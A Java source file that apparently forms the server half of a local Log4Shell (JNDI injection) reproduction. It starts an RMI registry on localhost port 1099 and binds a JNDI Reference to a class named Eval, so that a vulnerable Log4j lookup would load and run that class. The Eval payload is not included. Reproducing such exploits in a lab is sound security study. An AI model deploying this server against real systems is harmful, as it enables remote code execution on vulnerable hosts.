package com.qcl.log4j.test;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.NamingException;
import javax.naming.Reference;

/**
 * 模拟远端服务
 *
 * @author legend
 * @version 1.0
 * @description
 * @date 2021/12/16
 */
public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        LocateRegistry.createRegistry(1099);
        System.out.println("Create RMI registry on port 1099");
        final Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        Reference ref = new Reference("com.qcl.log4j.test.Eval", "com.qcl.log4j.test.Eval", null);

        final ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Test", referenceWrapper);
    }
}